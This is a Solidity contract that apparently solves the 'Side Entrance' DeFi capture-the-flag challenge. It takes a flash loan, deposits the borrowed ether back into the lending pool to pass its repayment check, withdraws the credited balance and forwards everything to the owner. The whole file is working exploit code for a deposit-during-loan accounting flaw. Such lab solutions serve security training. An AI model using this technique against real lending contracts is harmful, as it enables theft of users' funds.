// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./SideEntranceLenderPool.sol";

contract SideEntranceReceiver {
    using Address for address payable;

    SideEntranceLenderPool private immutable pool;
    address owner;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
        owner = msg.sender;
    }

    function flashLoan(uint256 amount) external {
        pool.flashLoan(amount);

        pool.withdraw();
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {
        payable(owner).sendValue(address(this).balance);
    }
}
